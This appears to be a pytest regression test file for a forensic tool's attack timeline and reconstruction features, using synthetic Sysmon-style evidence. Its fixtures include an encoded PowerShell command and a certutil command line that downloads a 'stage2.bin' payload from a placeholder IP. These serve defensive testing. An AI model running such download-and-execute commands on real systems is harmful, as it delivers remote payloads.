"""Regression tests for Advanced Timeline UI, data generation, and forensic traceability."""

from datetime import datetime, timezone
from pathlib import Path

import pytest

from ransomeye.advanced_timeline import build_advanced_timeline
from ransomeye.evidence import EvidenceEvent
from ransomeye.investigation import Investigation
from ransomeye.investigation_graph import build_investigation_graph
from ransomeye.reconstruction import reconstruct_attack


def test_timeline_no_empty_event_descriptions(tmp_path: Path):
    """Verify that reconstruct_attack and advanced timeline do not produce empty descriptions or titles."""
    ts = datetime(2026, 10, 9, 8, 2, 10, tzinfo=timezone.utc)
    ev_ps = EvidenceEvent(
        event_id="EVT-01",
        timestamp=ts,
        source="sysmon",
        event_type="process_creation",
        process_name="powershell.exe",
        pid=4120,
        command_line="powershell.exe -enc SQBFAFgA",
    )
    ev_net = EvidenceEvent(
        event_id="EVT-02",
        timestamp=ts,
        source="sysmon",
        event_type="network_connect",
        process_name="powershell.exe",
        pid=4120,
        network={"destination_ip": "198.51.100.45", "destination_port": 8443},
    )
    ev_hash = EvidenceEvent(
        event_id="EVT-03",
        timestamp=ts,
        source="forensic_file",
        event_type="file_stream_hash",
        file_path="suspicious_notice.eml",
        metadata={"observation": "phishing_message_provenance", "subject": "Urgent Security Verification"},
    )

    finding_ps = {
        "finding_id": "F-01",
        "finding_type": "suspicious_powershell",
        "reason": "Suspicious PowerShell indicators detected: -enc",
        "event_ids": ["EVT-01"],
    }

    inv = Investigation(
        case={"case_id": "TEST-TL-01", "host": "HOST-01"},
        evidence=[ev_ps, ev_net, ev_hash],
        findings=[finding_ps],
        correlations=[],
        timeline=[],
        processes={"nodes": {}},
        assessment=None,
    )
    graph = build_investigation_graph(inv)
    seq = reconstruct_attack(inv, graph)
    timeline = build_advanced_timeline(inv, seq, graph)

    entries = timeline.get_entries()
    assert len(entries) == 3

    for entry in entries:
        assert entry.title and entry.title.strip() != "", f"Empty title in {entry.entry_id}"
        assert entry.description and entry.description.strip() != "", f"Empty description in {entry.entry_id}"

    # Verify specific titles across types
    titles = {e.entry_type: e.title for e in entries}
    assert titles.get("COMMAND") == "Suspicious PowerShell Execution"
    assert "198.51.100.45:8443" in titles.get("NETWORK", "")
    assert titles.get("ARTIFACT_INGESTION") == "Phishing Artifact Submitted"


def test_timeline_repeated_timestamps_distinct_events():
    """Verify that multiple events sharing identical timestamps remain distinct and correctly ordered."""
    ts = datetime(2026, 10, 9, 8, 2, 10, tzinfo=timezone.utc)
    ev_proc = EvidenceEvent(
        event_id="EVT-P1",
        timestamp=ts,
        source="sysmon",
        event_type="process_creation",
        process_name="cmd.exe",
        pid=1001,
        command_line="cmd.exe /c start",
    )
    ev_net = EvidenceEvent(
        event_id="EVT-N1",
        timestamp=ts,
        source="sysmon",
        event_type="network_connect",
        process_name="cmd.exe",
        pid=1001,
        network={"destination_ip": "198.51.100.10", "destination_port": 80},
    )
    ev_file = EvidenceEvent(
        event_id="EVT-F1",
        timestamp=ts,
        source="sysmon",
        event_type="file_modify",
        file_path=r"C:\test\target.txt",
    )

    inv = Investigation(
        case={"case_id": "TEST-DUP-TS"},
        evidence=[ev_proc, ev_net, ev_file],
        findings=[],
        correlations=[],
        timeline=[],
        processes={"nodes": {}},
        assessment=None,
    )
    graph = build_investigation_graph(inv)
    seq = reconstruct_attack(inv, graph)
    timeline = build_advanced_timeline(inv, seq, graph)

    entries = timeline.get_entries()
    assert len(entries) == 3

    # Distinct evidence IDs preserved
    eids = [e.evidence_ids[0] for e in entries]
    assert eids == ["EVT-P1", "EVT-N1", "EVT-F1"]

    # All share identical timestamp
    assert entries[0].timestamp == ts
    assert entries[1].timestamp == ts
    assert entries[2].timestamp == ts

    # Correct priority: PROCESS before NETWORK before FILE_ACTIVITY
    assert entries[0].entry_type == "PROCESS"
    assert entries[1].entry_type == "NETWORK"
    assert entries[2].entry_type == "FILE_ACTIVITY"


def test_single_and_multi_event_correlations():
    """Verify single-event correlation behavior vs multi-event correlations."""
    ts = datetime(2026, 10, 9, 8, 2, 10, tzinfo=timezone.utc)
    ev1 = EvidenceEvent(event_id="EVT-01", timestamp=ts, source="sysmon", event_type="process_creation", process_name="test.exe", pid=100)
    ev2 = EvidenceEvent(event_id="EVT-02", timestamp=ts, source="sysmon", event_type="file_create", file_path=r"C:\a.txt")

    # Single-event correlation
    corr_single = {
        "incident_id": "INC-SINGLE",
        "start_time": "2026-10-09T08:02:10+00:00",
        "evidence_event_ids": ["EVT-01"],
    }
    # Multi-event correlation
    corr_multi = {
        "incident_id": "INC-MULTI",
        "start_time": "2026-10-09T08:02:10+00:00",
        "evidence_event_ids": ["EVT-01", "EVT-02"],
    }

    inv = Investigation(
        case={"case_id": "TEST-CORR"},
        evidence=[ev1, ev2],
        findings=[],
        correlations=[corr_single, corr_multi],
        timeline=[],
        processes={"nodes": {}},
        assessment=None,
    )
    graph = build_investigation_graph(inv)
    seq = reconstruct_attack(inv, graph)
    timeline = build_advanced_timeline(inv, seq, graph)

    entries = timeline.get_entries()

    # Event 1 attributes should have correlation annotations
    ev1_stage = next(s for s in seq.stages if "EVT-01" in s.evidence_ids and s.stage_type != "CORRELATION")
    assert "INC-SINGLE" in ev1_stage.attributes.get("correlation_ids", [])
    assert "INC-MULTI" in ev1_stage.attributes.get("correlation_ids", [])

    # In server serialization simulation: single-event correlation should be filtered out
    # while multi-event correlation is preserved
    filtered_for_ui = [
        e for e in entries
        if not (e.entry_type == "CORRELATION" and len(e.evidence_ids) <= 1)
    ]
    corr_entries = [e for e in filtered_for_ui if e.entry_type == "CORRELATION"]
    assert len(corr_entries) == 1
    assert corr_entries[0].correlation_ids == ("INC-MULTI",)
    assert len(corr_entries[0].evidence_ids) == 2


def test_missing_timestamps_and_assessment():
    """Verify that floating assessment stages without timestamps are separated safely."""
    ts = datetime(2026, 10, 9, 8, 2, 10, tzinfo=timezone.utc)
    ev = EvidenceEvent(event_id="EVT-01", timestamp=ts, source="sysmon", event_type="process_creation", process_name="orphan.exe")
    assess = {"score": 100, "severity": "CRITICAL", "confidence": 0.8}

    inv = Investigation(
        case={"case_id": "TEST-NO-TS"},
        evidence=[ev],
        findings=[],
        correlations=[],
        timeline=[],
        processes={"nodes": {}},
        assessment=assess,
    )
    graph = build_investigation_graph(inv)
    seq = reconstruct_attack(inv, graph)
    timeline = build_advanced_timeline(inv, seq, graph)

    entries = timeline.get_entries()
    assert len(entries) == 2
    assert entries[0].timestamp == ts

    # Assessment stage has timestamp None
    assert entries[1].entry_type == "ASSESSMENT"
    assert entries[1].timestamp is None


def test_evidence_traceability_and_attributes():
    """Verify that reconstructed stages preserve command_line, file_path, and finding reasons in attributes."""
    ts = datetime(2026, 10, 9, 8, 2, 10, tzinfo=timezone.utc)
    cmd = "certutil.exe -urlcache -split -f http://198.51.100.45:8443/stage2.bin"
    ev = EvidenceEvent(
        event_id="EVT-TRACE-01",
        timestamp=ts,
        source="sysmon",
        event_type="process_creation",
        process_name="certutil.exe",
        pid=4892,
        command_line=cmd,
    )
    finding = {
        "finding_id": "F-TRACE-01",
        "finding_type": "suspicious_certutil",
        "reason": "Suspicious certutil indicators detected: -urlcache, -split, -f",
        "event_ids": ["EVT-TRACE-01"],
    }

    inv = Investigation(
        case={"case_id": "TEST-TRACE"},
        evidence=[ev],
        findings=[finding],
        correlations=[],
        timeline=[],
        processes={"nodes": {}},
        assessment=None,
    )
    graph = build_investigation_graph(inv)
    seq = reconstruct_attack(inv, graph)

    stage = seq.stages[0]
    assert stage.evidence_ids == ("EVT-TRACE-01",)
    assert stage.finding_ids == ("F-TRACE-01",)
    assert stage.attributes.get("command_line") == cmd
    assert "Suspicious certutil" in stage.attributes.get("finding_reason", "")
    assert "CertUtil" in stage.title


def test_frontend_app_js_timezone_and_safe_dom():
    """Verify that app.js includes IST timezone formatting and contains zero innerHTML sinks."""
    app_js_path = Path("src/ransomeye/static/app.js")
    content = app_js_path.read_text(encoding="utf-8")

    # Timezone presentation: IST formatting check
    assert "IST" in content
    assert "Asia/Kolkata" in content or "5.5 * 60 * 60 * 1000" in content

    # Safe DOM compliance: zero innerHTML / outerHTML / insertAdjacentHTML
    assert "innerHTML" not in content
    assert "outerHTML" not in content
    assert "insertAdjacentHTML" not in content
    assert "document.write" not in content
    assert "eval(" not in content
